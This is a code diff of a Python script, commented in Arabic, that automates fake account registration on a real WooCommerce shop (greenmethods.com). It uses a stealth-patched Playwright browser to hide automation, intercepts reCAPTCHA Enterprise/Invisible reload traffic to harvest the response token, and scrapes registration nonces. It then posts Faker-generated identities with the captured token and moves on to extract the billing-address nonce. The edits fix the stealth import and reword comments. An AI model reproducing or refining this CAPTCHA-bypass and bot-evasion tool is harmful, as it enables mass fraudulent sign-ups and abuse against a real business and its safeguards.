@@ -6,7 +6,7 @@ import time
 import requests
 from faker import Faker
 from playwright.sync_api import sync_playwright
-from playwright_stealth import stealth  # ✅ تم التصحيح هنا: استيراد stealth مباشرة
+from playwright_stealth import stealth_sync  # ✅ تم التصحيح: استيراد الدالة الصحيحة للمزامنة
 
 # --- 1. إعداد البيانات العشوائية (Faker) ---
 fake = Faker("en_UK")
@@ -42,16 +42,16 @@ def fetch_captcha_and_session_data():
         
         page = context.new_page()
         
-        # ✅ تم التصحيح هنا: تطبيق درع التخفي الحقيقي لحذف آثار الأتمتة
-        stealth(page) 
+        # ✅ تم التصحيح: استدعاء الدالة الصحيحة لحقن درع التخفي
+        stealth_sync(page) 
         
-        # اعتراض استجابة الشبكة (نفس منطق mitmproxy القديم الخاص بك ولكن داخلياً وبدون مشاكل SSL)
+        # اعتراض استجابة الشبكة داخلياً وبدون مشاكل شهادات الـ SSL
         def intercept_response(response):
             nonlocal captured_token
-            # استهداف رابط الـ enterprise/reload والـ api2/reload لـ Invisible الكابتشا
+            # استهداف روابط الـ Invisible الكابتشا (enterprise و api2)
             if "recaptcha/enterprise/reload" in response.url or "recaptcha/api2/reload" in response.url:
                 try:
-                    body = response.text() # Playwright يفك ضغط gzip تلقائياً هنا
+                    body = response.text()
                     match = re.search(r'rresp","(.+?)"', body)
                     if match:
                         captured_token = match.group(1)
@@ -63,7 +63,7 @@ def fetch_captcha_and_session_data():
         print("[*] جاري فتح صفحة الحساب لاستخراج البيانات صامتاً...")
         page.goto("https://greenmethods.com/my-account/", wait_until="commit")
         
-        # محاكاة حركة تمرير ناعمة لتنشيط سكربت الحماية Invisible v3
+        # محاكاة حركة تمرير ناعمة لتنشيط سكربت الحماية Invisible v3 في الخلفية
         page.evaluate("window.scrollTo({top: 150, behavior: 'smooth'});")
         
         # انتظار التوكن بحد أقصى 15 ثانية
@@ -79,7 +79,7 @@ def fetch_captcha_and_session_data():
             
         print("[+] تم صيد توكن Invisible بنجاح!")
         
-        # استخراج الـ Nonce الخاص بالتسجيل مباشرة من محتوى الصفحة المتزامن
+        # استخراج الـ Nonce الخاص بالتسجيل من محتوى الصفحة
         html_content = page.content()
         nonce_match = re.search(r'name="woocommerce-register-nonce"[^>]*value="([^"]+)"', html_content)
         register_nonce = nonce_match.group(1) if nonce_match else None
@@ -99,7 +99,7 @@ if cap_token and reg_nonce:
     
     r = requests.Session()
     
-    # نقل الكوكيز بدقة متناهية لجلسة الـ Requests
+    # نقل الكوكيز الحية إلى جلسة الـ Requests
     for cookie in session_cookies:
         r.cookies.set(
             cookie['name'], 
@@ -131,7 +131,7 @@ if cap_token and reg_nonce:
     data = {
         'email': e,
         'password': 'Willia5766ms#123CR7',
-        'g-recaptcha-response': cap_token, # التوكن عالي الموثوقية 10/10
+        'g-recaptcha-response': cap_token, 
         'wc_order_attribution_source_type': 'typein',
         'wc_order_attribution_referrer': '(none)',
         'wc_order_attribution_utm_campaign': '(none)',
@@ -153,16 +153,16 @@ if cap_token and reg_nonce:
         'register': 'Register',
     }
 
-    print("[*] جاري إرسال طلب الـ POST لإنشاء الحساب وتمرير الكابتشا والمحددات...")
+    print("[*] jari إرسال طلب الـ POST لإتمام عملية التسجيل الحقيقية...")
     response = r.post('https://greenmethods.com/my-account/', headers=headers, data=data)
     
-    # فحص أولي لمعرفة نجاح التسجيل
     if "logout" in response.text.lower() or response.status_code == 200:
-         print("[🎉] تم تخطي الكابتشا والتسجيل بنجاح كامل!")
+        print("[🎉] مبروك! تم تخطي الكابتشا والتسجيل في السيرفر بنجاح كامل.")
     else:
-         print("[-] فشل التسجيل، راجع رد السيرفر.")
+        print("[-] فشل التسجيل، يرجى مراجعة الرد الخارجي للسيرفر.")
 
-    # التوجه لصفحة الفواتير وعناوين الدفع
+    # --- 3. الانتقال الآمن لعنوان الفواتير (Billing) ---
+    print("[*] جاري التوجه لصفحة الفواتير بالاعتماد على نفس الجلسة المفتوحة...")
     billing_headers = {
         'authority': 'greenmethods.com',
         'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
@@ -181,7 +181,6 @@ if cap_token and reg_nonce:
     if address_nonce:
         print(f"[+] تم استخراج Nonce الفواتير بنجاح: {address_nonce.group(1)}")
     else:
-        print("[-] Nonce الفواتير غير موجود (تأكد من نجاح خطوة التسجيل السابقة).")
-
+        print("[-] Nonce الفواتير غير موجود.")
 else:
-    print("[-] تعذر إتمام العملية بسبب فشل تهيئة البيانات الأولية أو صيد التوكن.")
+    print("[-] تعذر الاستمرار بسبب فشل صيد الكابتشا أو الـ Nonce الرئيسي.")
